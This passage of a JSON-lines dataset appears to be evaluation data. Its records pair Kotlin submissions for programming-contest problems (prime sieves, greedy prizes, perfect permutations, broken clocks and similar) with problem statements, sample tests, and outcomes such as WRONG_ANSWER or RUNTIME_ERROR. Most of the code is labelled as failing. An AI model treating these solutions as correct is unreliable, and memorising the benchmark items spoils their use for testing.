(2..limit).forEach { i ->\r\n    if (s[i]) (i * i..n).forEach { j -> s[j] = false }\r\n  }\r\n  return s.toList()\r\n}\r\n\r\nfun primes(n: Int) = primeSieve(n).mapIndexedNotNull { i, p -> i.takeIf { p } }\r\n\r\n\/\/ DP\r\ninline fun <I, O> memoize(crossinline fn: (I) -> O): ((I) -> O) = with(ConcurrentHashMap<I, O>()) {\r\n  { input -> get(input) ?: fn(input).also { output -> set(input, output) } }\r\n}\r\n\/\/ endregion\r\n\r\nfun solve(p: String, q: String): Boolean {\r\n  if (p.length != q.length)\r\n    return false\r\n  val m = p.zip(q).withIndex().filter { (_, v) -> v.first != v.second }.map { it.index }\r\n  if (m.size != 2)\r\n    return false\r\n  val (i, j) = m\r\n  if (j - 1 != i)\r\n    return false\r\n  return p[i] == q[j] && p[j] == q[i]\r\n}\r\n\r\nfun main() {\r\n  val (p, q) = readLines(2)\r\n  println(solve(p, q).yesNo())\r\n}","description":"Some dwarves that are finishing the StUDY (State University for Dwarven Youngsters) Bachelor courses, have been told \"no genome, no degree\". That means that all dwarves should write a thesis on genome. Dwarven genome is far from simple. It is represented by a string that consists of lowercase Latin letters.Dwarf Misha has already chosen the subject for his thesis: determining by two dwarven genomes, whether they belong to the same race. Two dwarves belong to the same race if we can swap two characters in the first dwarf's genome and get the second dwarf's genome as a result. Help Dwarf Misha and find out whether two gnomes belong to the same race or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the first dwarf's genome: a non-empty string, consisting of lowercase Latin letters.\nThe second line contains the second dwarf's genome: a non-empty string, consisting of lowercase Latin letters.\nThe number of letters in each genome doesn't exceed 10^5. It is guaranteed that the strings that correspond to the genomes are different. The given genomes may have different length.\n","output_spec":"Print \"YES\", if the dwarves belong to the same race. Otherwise, print \"NO\".\n","notes":"  First example: you can simply swap two letters in string \"ab\". So we get \"ba\".  Second example: we can't change string \"aa\" into string \"ab\", because \"aa\" does not contain letter \"b\". ","sample_inputs":["ab\nba\n","aa\nab\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":1200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_432","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner\n\nfun main() {\n\n    val sc = Scanner(System.`in`)\n    val n : Int = sc.nextInt()\n    val p = IntArray(n)\n    val abcde = IntArray(5)\n    val count = IntArray(5)\n    var total : Int = 0\n\n    for (i in 0 until n) p[i] = sc.nextInt()\n    for (i in 0..4) abcde[i] = sc.nextInt()\n\n    for (i in 0 until n) {\n        total += p[i]\n        for (i in 4 downTo 0) {\n            if (abcde[i] <= total) {\n                count[i] += (total \/ abcde[i])\n                total %= abcde[i]\n            }\n        }\n    }\n\n    for (i in 0..4) println(count[i])\n    print(total)\n\n}","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1300,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"230_B","submission_id":"210009516","tags":["binary+search","implementation","math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.*\nimport kotlin.collections.*\nimport kotlin.math.*\nimport java.io.*\n\nval INPUT = System.`in`\nval read = INPUT.bufferedReader()\nfun main() {\n\n    \n    val n = 1000001;\n    var prime = Array(n+5){true}\n    prime[0]=false; prime[1]=false;\n    \n    for(i in 2..n+1){\n        if(prime[i]==true)\n            for(j in 2*i..n+1 step i)\n                prime[j]=false\n    }\n    \n    var h = HashSet<Long>();\n    for(i in 0..n){\n        if(prime[i]==true)\n            h.add(i.toLong()*i.toLong())\n    }\n\n    \n    var s = StringTokenizer(read.readLine())\n    var N = s.nextToken().toInt()\n    s = StringTokenizer(read.readLine())\n    for(i in 1..N){\n        if(h.contains(s.nextToken().toLong()))\n            println(\"YES\")\n        else\n            println(\"NO\")\n    }\n\n\n}\n","description":"We know that prime numbers are positive integers that have exactly two distinct positive divisors. Similarly, we'll call a positive integer t \u0422-prime, if t has exactly three distinct positive divisors.You are given an array of n positive integers. For each of them determine whether it is \u0422-prime or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single positive integer, n (1\u2264n\u226410^5), showing how many numbers are in the array. The next line contains n space-separated integers xi (1\u2264xi\u226410^12).\nPlease, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is advised to use the cin, cout streams or the %I64d specifier.\n","output_spec":"Print n lines: the i-th line should contain \"YES\" (without the quotes), if number xi is \u0422-prime, and \"NO\" (without the quotes), if it isn't.\n","notes":"The given test has three numbers. The first number 4 has exactly three divisors \u2014 1, 2 and 4, thus the answer for this number is \"YES\". The second number 5 has two divisors (1 and 5), and the third number 6 has four divisors (1, 2, 3, 6), hence the answer for them is \"NO\".\n","sample_inputs":["3\n4 5 6\n"],"sample_outputs":["YES\nNO\nNO\n"]}
{"difficulty":800,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"231_A","submission_id":"222404281","tags":["brute+force","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main() {\n    val n = readLine()!!.toInt() \/\/ Read the number of problems (n)\n\n    repeat(n) {\n        val (petya, vasya, tonya) = readLine()!!.split(\" \").map { it.toInt() }\n\n        \/\/ Process the views of Petya, Vasya, and Tonya here\n        \/\/ You can perform any calculations or operations needed\n\n        \/\/ Example: Determine if the majority is sure about the solution\n        if ((petya + vasya + tonya) >= 2) {\n            println(\"1\") \/\/ Majority is sure\n        } else {\n            println(\"0\") \/\/ Majority is not sure\n        }\n    }\n}\n\n \t    \t\t \t\t \t\t\t   \t\t   \t\t   \t\t","description":"One day three best friends Petya, Vasya and Tonya decided to form a team and take part in programming contests. Participants are usually offered several problems during programming contests. Long before the start the friends decided that they will implement a problem if at least two of them are sure about the solution. Otherwise, the friends won't write the problem's solution.This contest offers n problems to the participants. For each problem we know, which friend is sure about the solution. Help the friends find the number of problems for which they will write a solution.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a single integer n (1\u2264n\u22641000) \u2014 the number of problems in the contest. Then n lines contain three integers each, each integer is either 0 or 1. If the first number in the line equals 1, then Petya is sure about the problem's solution, otherwise he isn't sure. The second number shows Vasya's view on the solution, the third number shows Tonya's view. The numbers on the lines are separated by spaces.\n","output_spec":"Print a single integer \u2014 the number of problems the friends will implement on the contest.\n","notes":"In the first sample Petya and Vasya are sure that they know how to solve the first problem and all three of them know how to solve the second problem. That means that they will write solutions for these problems. Only Petya is sure about the solution for the third problem, but that isn't enough, so the friends won't take it. \nIn the second sample the friends will only implement the second problem, as Vasya and Tonya are sure about the solution.\n","sample_inputs":["3\n1 1 0\n1 1 1\n1 0 0\n","2\n1 0 0\n0 1 1\n"],"sample_outputs":["2\n","1\n"]}
{"difficulty":800,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"233_A","submission_id":"200672549","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.Scanner\r\nfun main(){\r\n    val input=Scanner(System.`in`)\r\n    val n=input.nextInt()\r\n    result(n)\r\n    }\r\nval result:(Int)->Unit={\r\n    if(it==1){\r\n        println(-1)\r\n    }else{\r\n        var c=0\r\n        if(it%2!=0){\r\n            c=1\r\n        }\r\n        var i=1\r\n        while(i<=it-c-1){\r\n            if(i!=1){\r\n                print(\" \")\r\n            }\r\n            if(it%2!=0&&i==it-2){\r\n                print(\"${i+2} $i ${i+1}\")\r\n                break\r\n            }\r\n            print(\"${i+1} $i\")\r\n            i+=2\r\n        }\r\n    }\r\n}\r\n","description":"A permutation is a sequence of integers p1,p2,...,pn, consisting of n distinct positive integers, each of them doesn't exceed n. Let's denote the i-th element of permutation p as pi. We'll call number n the size of permutation p1,p2,...,pn.Nickolas adores permutations. He likes some permutations more than the others. He calls such permutations perfect. A perfect permutation is such permutation p that for any i (1\u2264i\u2264n) (n is the permutation size) the following equations hold ppi=i and pi\u2260i. Nickolas asks you to print any perfect permutation of size n for the given n.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2264n\u2264100) \u2014 the permutation size.\n","output_spec":"If a perfect permutation of size n doesn't exist, print a single integer -1. Otherwise print n distinct integers from 1 to n, p1,p2,...,pn \u2014 permutation p, that is perfect. Separate printed numbers by whitespaces.\n","notes":null,"sample_inputs":["1\n","2\n","4\n"],"sample_outputs":["-1\n","2 1 \n","2 1 4 3 \n"]}
{"difficulty":1100,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1129","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main() {\n    fun readInt() = readLine()!!.toInt()\n\n    readLine()\n    val dominoes = readLine()!!\n    var count = 0\n    var sol = 0\n    var first = true\n    var lastLeft = true\n    for (c in dominoes)\n        when (c) {\n            '.' -> count++\n            'R' -> {\n                sol += count\n                count = 0\n                lastLeft = false\n            }\n            'L' -> {\n                if (!first) sol += count % 2\n                first = false\n                count = 0\n                lastLeft = true\n            }\n        }\n    if (lastLeft) sol += count\n    print(sol)\n}","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":1100,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"5d11fa8528f1dc873d50b3417bef8c79","submission_id":"re_871","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/xXHEQR_MAENXx\n\/\/  You are not prepared!\n@file:Suppress(\"NOTHING_TO_INLINE\", \"EXPERIMENTAL_FEATURE_WARNING\", \"OVERRIDE_BY_INLINE\")\n\nimport java.io.PrintWriter\nimport java.util.*\nimport kotlin.math.*\nimport kotlin.random.*\nimport kotlin.random.Random\nimport kotlin.collections.sort as _sort\nimport kotlin.collections.sortDescending as _sortDescending\n\n\/\/@JvmField val INPUT = File(\"input.txt\").inputStream()\n\/\/@JvmField val OUTPUT = File(\"output.txt\").outputStream()\n@JvmField val INPUT = System.`in`\n@JvmField val OUTPUT = System.out\n\n@JvmField val _reader = INPUT.bufferedReader()\nfun readLine(): String? = _reader.readLine()\nfun readLn() = _reader.readLine()!!\n@JvmField var _tokenizer: StringTokenizer = StringTokenizer(\"\")\nfun read(): String {\n    while (_tokenizer.hasMoreTokens().not()) _tokenizer = StringTokenizer(_reader.readLine() ?: return \"\", \" \")\n    return _tokenizer.nextToken()\n}\nfun readInt() = read().toInt()\nfun readDouble() = read().toDouble()\nfun readLong() = read().toLong()\nfun readStrings(n: Int) = List(n) { read() }\nfun readLines(n: Int) = List(n) { readLn() }\nfun readInts(n: Int) = List(n) { read().toInt() }\nfun readIntArray(n: Int) = IntArray(n) { read().toInt() }\nfun readDoubles(n: Int) = List(n) { read().toDouble() }\nfun readDoubleArray(n: Int) = DoubleArray(n) { read().toDouble() }\nfun readLongs(n: Int) = List(n) { read().toLong() }\nfun readLongArray(n: Int) = LongArray(n) { read().toLong() }\n\n@JvmField val _writer = PrintWriter(OUTPUT, false)\n\nprivate inline fun <T> _shuffle(rnd: Random, get: (Int) -> T, set: (Int, T) -> Unit, size: Int) {\n    \/\/ Fisher-Yates shuffle algorithm\n    for (i in size - 1 downTo 1) {\n        val j = rnd.nextInt(i + 1)\n        val temp = get(i)\n        set(i, get(j))\n        set(j, temp)\n    }\n}\n\n@JvmField var _random: Random? = null\nval random get() = _random ?: Random(0x594E215C127 * System.nanoTime()).also { _random = it }\n\nfun IntArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun IntArray.sort() { shuffle(); _sort() }\nfun IntArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun LongArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun LongArray.sort() { shuffle(); _sort() }\nfun LongArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun DoubleArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun DoubleArray.sort() { shuffle(); _sort() }\nfun DoubleArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun CharArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\ninline fun CharArray.sort() { _sort() }\ninline fun CharArray.sortDescending() { _sortDescending() }\ninline fun String.sort(): String {\n    var bhgdf = toCharArray()\n    bhgdf.sort()\n    return String(bhgdf)\n}\n\ninline fun <T: Comparable<T>> Array<out T>.sort() = _sort()\ninline fun <T: Comparable<T>> Array<out T>.sortDescending() = _sortDescending()\ninline fun <T: Comparable<T>> MutableList<out T>.sort() = _sort()\ninline fun <T: Comparable<T>> MutableList<out T>.sortDescending() = _sortDescending()\n\nfun main() { _writer.solve(); _writer.flush() }\nfun PrintWriter.solve() {\n    val n = readInt()\n    var ar = readIntArray(n)\n\n    var res = 1\n    for (i in 0..n-1) {\n        var cur = 1\n        if (i > 0) for (j in i-1 downTo 0) {\n            println(\"$j \")\n            if (ar[j] <= ar[j+1]) {\n                ++cur\n            }\n            else {\n                break\n            }\n        }\n\n        if (i < n) for (j in i+1..n-1) {\n            if (ar[j] <= ar[j-1]) {\n                ++cur\n            }\n            else {\n                break\n            }\n        }\n        \/\/println(\"$res $cur\")\n        res = max(res, cur)\n    }\n    println(res)\n}\n","description":"Little Petya often travels to his grandmother in the countryside. The grandmother has a large garden, which can be represented as a rectangle 1\u2009\u00d7\u2009n in size, when viewed from above. This rectangle is divided into n equal square sections. The garden is very unusual as each of the square sections possesses its own fixed height and due to the newest irrigation system we can create artificial rain above each section.Creating artificial rain is an expensive operation. That's why we limit ourselves to creating the artificial rain only above one section. At that, the water from each watered section will flow into its neighbouring sections if their height does not exceed the height of the section. That is, for example, the garden can be represented by a 1\u2009\u00d7\u20095 rectangle, where the section heights are equal to 4, 2, 3, 3, 2. Then if we create an artificial rain over any of the sections with the height of 3, the water will flow over all the sections, except the ones with the height of 4. See the illustration of this example at the picture:  As Petya is keen on programming, he decided to find such a section that if we create artificial rain above it, the number of watered sections will be maximal. Help him. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). The second line contains n positive integers which are the height of the sections. All the numbers are no less than 1 and not more than 1000.","output_spec":"Print a single number, the maximal number of watered sections if we create artificial rain above exactly one section.","notes":null,"sample_inputs":["1\n2","5\n1 2 1 2 1","8\n1 2 1 1 1 3 3 4"],"sample_outputs":["1","3","6"]}
{"difficulty":800,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_1346","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner\n\nfun main(args : Array<String>) {\n\n    val reader = Scanner(System.`in`)\n    var n: Int = reader.nextInt()\n    var arr = IntArray(n-1)\n\n    for (i in 0..n - 2) {\n        arr[i] = reader.nextInt()\n    }\n    var a: Int = reader.nextInt()\n    var b: Int = reader.nextInt()\n\n    var sum = 0\n    var d = b - a\n    var i = 0\n\n    while(d > 0){\n        sum = sum + arr[i]\n        i++\n        d--\n    }\n    println(sum)\n}\n","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":900,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"6b22e93f7e429693dcfe3c099346dcda","submission_id":"6bdc88299483a6c93379d24c3ed2bdd6","tags":["implementation","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.Scanner\nfun main()\n{\n var n = readLine()!!.toInt()\n var s = readLine()!!.toString()\n if(n>26)println(\"Yes\")\n else{\n var str=\"abcdefghijklmnopqrstuvwxyz\"\n var f=0\n for(i in 0..str.length-1)\n {\n    var c=0\n    for(j in 0..s.length-1)\n    {\n        if(s[j]==str[i])c+=1\n    }\n    if(c>=2)\n    {\n    f=1\n    break\n    }\n }\n if(f==1)println(\"Yes\")\n else println(\"No\")\n }\n}","description":"Panic is rising in the committee for doggo standardization\u00a0\u2014 the puppies of the new brood have been born multi-colored! In total there are 26 possible colors of puppies in the nature and they are denoted by letters from 'a' to 'z' inclusive.The committee rules strictly prohibit even the smallest diversity between doggos and hence all the puppies should be of the same color. Thus Slava, the committee employee, has been assigned the task to recolor some puppies into other colors in order to eliminate the difference and make all the puppies have one common color.Unfortunately, due to bureaucratic reasons and restricted budget, there's only one operation Slava can perform: he can choose a color $$$x$$$ such that there are currently at least two puppies of color $$$x$$$ and recolor all puppies of the color $$$x$$$ into some arbitrary color $$$y$$$. Luckily, this operation can be applied multiple times (including zero).For example, if the number of puppies is $$$7$$$ and their colors are represented as the string \"abababc\", then in one operation Slava can get the results \"zbzbzbc\", \"bbbbbbc\", \"aaaaaac\", \"acacacc\" and others. However, if the current color sequence is \"abababc\", then he can't choose $$$x$$$='c' right now, because currently only one puppy has the color 'c'.Help Slava and the committee determine whether it is possible to standardize all the puppies, i.e. after Slava's operations all the puppies should have the same color.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$1 \\le n \\le 10^5$$$)\u00a0\u2014 the number of puppies. The second line contains a string $$$s$$$ of length $$$n$$$ consisting of lowercase Latin letters, where the $$$i$$$-th symbol denotes the $$$i$$$-th puppy's color.","output_spec":"If it's possible to recolor all puppies into one color, print \"Yes\". Otherwise print \"No\". Output the answer without quotation signs.","notes":"NoteIn the first example Slava can perform the following steps:   take all puppies of color 'a' (a total of two) and recolor them into 'b';  take all puppies of color 'd' (a total of two) and recolor them into 'c';  take all puppies of color 'b' (three puppies for now) and recolor them into 'c'. In the second example it's impossible to recolor any of the puppies.In the third example all the puppies' colors are the same; thus there's no need to recolor anything.","sample_inputs":["6\naabddc","3\nabc","3\njjj"],"sample_outputs":["Yes","No","Yes"]}
{"difficulty":800,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_1151","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.*\nfun main(args: Array<String>) {var reader = Scanner(System.`in`)\n    var numOfChild = reader.nextInt()\n    var numOfThrow = numOfChild-1\n    var c=1\n    var w=1\n    for (i in 1..numOfThrow)\n    {\n        c= c+w\n        if (c>=numOfChild)\n        {\n            c-=numOfChild\n        }\n        w++\n        print(\"$c \")\n    }\n}","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1300,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_572","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main(args: Array<String>) {\n    val n = readLine()!!.toInt()\n    var s = readLine()!!.split(\":\").toMutableList()\n    if (n == 12) {\n        if (s[0].toInt() > 12) {\n            if (s[0][1].toInt() != 1) s[0] = \"0\" + s[0].drop(1)\n            else s[0] = \"1\" + s[0].drop(1)\n        } else if (s[0].toInt() == 0) s[0] = \"1\" + s[0].drop(1)\n    } else if (s[0].toInt() > 23) s[0] = \"0\" + s[0].drop(1)\n\n    if (s[1].toInt() >= 60) s[1] = \"0\" + s[1].drop(1)\n    print(s.joinToString(\":\"))\n}","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":800,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"b69170c8377623beb66db4706a02ffc6","submission_id":"a071eab38ba898956c751d5d6e24cd70","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"fun main()= repeat(readLine()!!.toInt()){ var r = readLine()!!.toInt();print(if (r % 2 == 0) (r\/2) -1 else r\/2) }","description":"There are two sisters Alice and Betty. You have $$$n$$$ candies. You want to distribute these $$$n$$$ candies between two sisters in such a way that:  Alice will get $$$a$$$ ($$$a &gt; 0$$$) candies;  Betty will get $$$b$$$ ($$$b &gt; 0$$$) candies;  each sister will get some integer number of candies;  Alice will get a greater amount of candies than Betty (i.e. $$$a &gt; b$$$);  all the candies will be given to one of two sisters (i.e. $$$a+b=n$$$). Your task is to calculate the number of ways to distribute exactly $$$n$$$ candies between sisters in a way described above. Candies are indistinguishable.Formally, find the number of ways to represent $$$n$$$ as the sum of $$$n=a+b$$$, where $$$a$$$ and $$$b$$$ are positive integers and $$$a&gt;b$$$.You have to answer $$$t$$$ independent test cases.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer $$$t$$$ ($$$1 \\le t \\le 10^4$$$) \u2014 the number of test cases. Then $$$t$$$ test cases follow. The only line of a test case contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^9$$$) \u2014 the number of candies you have.","output_spec":"For each test case, print the answer \u2014 the number of ways to distribute exactly $$$n$$$ candies between two sisters in a way described in the problem statement. If there is no way to satisfy all the conditions, print $$$0$$$.","notes":"NoteFor the test case of the example, the $$$3$$$ possible ways to distribute candies are:  $$$a=6$$$, $$$b=1$$$;  $$$a=5$$$, $$$b=2$$$;  $$$a=4$$$, $$$b=3$$$. ","sample_inputs":["6\n7\n1\n2\n3\n2000000000\n763243547"],"sample_outputs":["3\n0\n0\n1\n999999999\n381621773"]}
{"difficulty":1000,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_1330","tags":["implementation","greedy","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.Scanner\n\nval checker: (String, Int) -> Boolean = {str, int -> str.length < int}\nval diffvals: String -> Int= {word -> word.chars().distinct().count()}\n\nfun main(args: Array<String>) {\n    val inp = Scanner(System.`in`)\n    var word = inp.next()\n    var diffs = inp.nextInt()\n    \n    if(checker(word, diffs)) {\n        println(\"impossible\")\n    } else {\n        println(word.length - diffs)\n    }\n}","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
